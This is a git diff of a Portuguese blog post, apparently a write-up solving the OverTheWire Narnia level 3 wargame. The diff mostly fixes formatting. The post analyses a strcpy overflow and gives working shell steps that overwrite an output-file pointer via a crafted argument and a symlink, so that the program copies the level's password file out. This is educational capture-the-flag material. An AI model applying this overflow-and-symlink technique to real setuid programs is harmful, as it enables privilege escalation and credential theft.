@@ -14,7 +14,8 @@ categories: [CTFs]
 
 Dando seguimento a série de write ups do <a href="http://overthewire.org/wargames/narnia/">Narnia</a>, chegou a hora de exploitar o level3.
 
-```narnia3@melinda:/narnia$ ./narnia3
+```
+narnia3@melinda:/narnia$ ./narnia3
 usage, ./narnia3 file, will send contents of file 2 /dev/null
 ```
 
@@ -24,7 +25,7 @@ Antes de qualquer análise, pensei que seria óbvio que, por ter permissões de 
 
 Mas como o código fonte está bem perto de nós, vamos observa-lo e descobrir se há alguma forma de explorar esta habilidade de leitura de arquivos.
 
-https://gist.github.com/anonymous/2978f3a6b1db2a77494d01c58de34384
+<script src="https://gist.github.com/anonymous/2978f3a6b1db2a77494d01c58de34384.js"></script>
 
 Nada complexo. Mas vamos por partes.
 
@@ -50,7 +51,7 @@ Logo depois das declarações de variáveis, há um simples if que verifica se a
         printf(usage, %s file, will send contents of file 2 /dev/null\n,argv[0]);
         exit(-1);
     }
-    ```
+```
 
 A parte seguinte do código usa a função amiga dos buffer overflow e inimiga dos dados guardados na stack, <strong>strcpy</strong>, que sem nenhum cuidado vai copiar argv[1] direto para ifile. E, depois de fazer essa operação perigosa, usa os file descriptors para checar se há permissão de escrita e leitura em ofile, e leitura em ifile.
 
@@ -64,7 +65,8 @@ A parte seguinte do código usa a função amiga dos buffer overflow e inimiga d
      if((ifd = open(ifile, O_RDONLY)) 0 ){
          printf(error opening %s\n, ifile);
          exit(-1);
-     }```
+     }
+ ```
 
 Para finalizar, a última parte da função lê o ifile e copia o conteúdo para buf e logo depois escreve de buf para ofile. Fechando os arquivos logo depois.
 
@@ -79,13 +81,15 @@ Para finalizar, a última parte da função lê o ifile e copia o conteúdo para
     close(ofd);
 
     exit(1);
-    }```
+    }
+ ```
 
 Depois de compreender todo o código, pareceu que para ganhar a flag bastava estourar ifile passando um argumento do mal que executasse /bin/sh assim como foi feito no <a href="https://brenn0.wordpress.com/2017/01/03/level-2-overthewire-ctf-narnia-write-up/">último chall</a>. Sei bem que não faria sentido que dois challs seguidos tivessem a mesma resolução, <a href="https://brenn0.wordpress.com/category/ctfs/over-the-wire/leviathan/">mas já aconteceu coisa parecida antes</a>, então não custava tentar.
 
 Mas essa ideia logo se mostrou impossível assim que mandei um checksec com o binário carregado no gdb aprimorado pelo peda.
 
-```narnia3@melinda:/tmp/2017$ gdb -q /narnia/narnia3
+```
+narnia3@melinda:/tmp/2017$ gdb -q /narnia/narnia3
 Reading symbols from /narnia/narnia3...(no debugging symbols found)...done.
 (gdb) source /usr/local/peda/peda.py
 gdb-peda$ checksec
@@ -93,9 +97,10 @@ CANARY    : disabled
 FORTIFY   : disabled
 NX        : ENABLED
 PIE       : disabled
-RELRO     : disabled```
+RELRO     : disabled
+```
 
-<blockquote>O bit NX, que deriva da expressão em inglês No eXecute, é uma tecnologia usada em alguns processadores e sistemas operacionais que separa de modo rígido as áreas de memória que podem ser usadas para execução de código daquelas que só podem servir para armazenar dados. Ele é usada com propósitos de segurança.
+O bit NX, que deriva da expressão em inglês No eXecute, é uma tecnologia usada em alguns processadores e sistemas operacionais que separa de modo rígido as áreas de memória que podem ser usadas para execução de código daquelas que só podem servir para armazenar dados. Ele é usada com propósitos de segurança.
 
 Uma área da memória que esteja marcada com o atributo NX pode ser usada somente para guardar dados, então quaisquer instruções que estejam nela não serão executadas. A técnica serve para prevenir certos tipos de ataques feitos por malwares, quando o programa malicioso insere instruções na área de dados de outro programa, tentando que elas sejam executadas a partir de lá. Esse tipo de ataque é chamado de buffer overflow.
 
@@ -119,35 +124,21 @@ Acredito que você se lembre de quando falei de strcpy. Na 22º linha do código
 
 Sabendo disso você até pode resolver o chall sozinho. Vá lá e só volte aqui para comparar soluções.
 
-<hr />
-
-<hr />
-
-<hr />
-
-<hr />
-
-<hr />
-
-<hr />
-
-<hr />
-
-<hr />
-
 Tendo o poder de corromper o valor de ofile guardado no stack, a primeira ideia é a de modificar esse valor para um arquivo válido e sob nosso controle.
 
 Tomei a liberdade fazer uma pequena alteração do código do chall só para ver isso acontecendo de forma mais prática, observe as inserções na linha 21 e 27:
 
-https://gist.github.com/anonymous/b78a2c589773cd2c2db5034257e38441
+<script src="https://gist.github.com/anonymous/b78a2c589773cd2c2db5034257e38441.js"></script>
 
 Agora compilando e executando:
 
-```suamae@yourbox:~/tmp$ gcc narnia3.c -o narnia3
+```
+suamae@yourbox:~/tmp$ gcc narnia3.c -o narnia3
 suamae@yourbox:~/tmp$ ./narnia3 `python -c 'print B*32 + ownded'`
 Antes: /dev/null
 error opening BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBownded
-Depois: ownded```
+Depois: ownded
+```
 
 Exatamente o comportamento esperado.
 
@@ -155,7 +146,8 @@ Exploitation time!
 
 Criei uma pasta em /tmp e dentro dela criei um link simbólico para /etc/narnia_pass/narnia4. O nome desse link era formado pelos 32 B's necessários para preencher todo o espaço de ifile + flag (que é o nome do arquivo que também criei para que o processo escrevesse a flag).
 
-```narnia3@melinda:~$ cd /narnia
+```
+narnia3@melinda:~$ cd /narnia
 narnia3@melinda:/narnia$ mkdir /tmp/rddi
 narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/rddi/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBflag
 narnia3@melinda:/narnia$ cd /tmp/rddi
@@ -164,4 +156,5 @@ narnia3@melinda:/tmp/rddi$ /narnia/narnia3 `python -c 'print B*32 + flag'`
 copied contents of BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBflag to a safer place... (flag)
 narnia3@melinda:/tmp/rddi$ cat flag
 c2ljaw==
-▒▒▒▒▒4▒▒▒▒_▒▒}0,narnia3@melinda:/tmp/rddi$```
+▒▒▒▒▒4▒▒▒▒_▒▒}0,narnia3@melinda:/tmp/rddi$
+```
